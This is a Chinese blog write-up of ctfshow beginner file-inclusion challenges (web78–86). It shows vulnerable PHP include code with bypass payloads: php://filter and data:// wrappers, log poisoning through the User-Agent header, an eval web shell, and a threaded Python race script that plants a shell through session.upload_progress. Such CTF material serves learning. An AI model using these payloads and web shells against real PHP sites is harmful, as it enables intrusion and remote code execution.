# 原创
：  ctfshow web入门-文件包含

# ctfshow web入门-文件包含

#### ctfshow web入门-文件包含

## web78

> 
filter伪协议读取：`?file=php://filter/read=convert.base64-encode/resource=flag.php`，base64解码


```
if(isset($_GET['file'])){
    $file = $_GET['file'];
    include($file);
}else{
    highlight_file(__FILE__);
}

```

<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210623194836880.png#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210623194930889.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>

## web79

> 
由于过滤了 `php`，采用data伪协议读取：


```
?file=data://text/plain,&lt;?= `tac f*`;?&gt;
或者
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=

```

```
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
}

```

## web80

> 
由于 `php` 和 `data`都被过滤了，结合题目提示我们文件包含开始，利用日志包含绕过，将执行的命令插入日志中，在User-Agent插入 `&lt;?php echo system('ls');?&gt;`查找flag文件名，再读取flag


```
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
}

```

```
shell.txt内容：
&lt;?php eval($_POST['cmd']);?&gt;

```

<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210623202300993.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/2021062320230731.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>

## web81

> 
过滤了 `php`、`data` 和 `:`，参照 web81，利用日志包含绕过，将执行的命令插入日志中


```
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
}

```

<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210623203835648.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/202106232038430.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>

## web82-86

> 
利用session.upload_progress进行文件包含和反序列化渗透


```
import requests
import threading
import sys
session=requests.session()
sess='H3rmesk1t'
url1="http://dae1ae47-1634-456b-b6bb-6046960b2e14.challenge.ctf.show:8080/"
url2='http://dae1ae47-1634-456b-b6bb-6046960b2e14.challenge.ctf.show:8080/?file=/tmp/sess_'+sess
data1={
	'PHP_SESSION_UPLOAD_PROGRESS':'&lt;?php eval($_POST[1]);?&gt;'
}
data2={
	'1':'system("cat f*");'
}
file={
	'file':'abc'
}
cookies={
	'PHPSESSID': sess
}
def write():
	while True:
		r = session.post(url1,data=data1,files=file,cookies=cookies)
def read():
	while True:
		r = session.post(url2,data=data2)
		if 'ctfshow{' in r.text:
			print(r.text)
threads = [threading.Thread(target=write),
       threading.Thread(target=read)]
for t in threads:
	t.start()

```
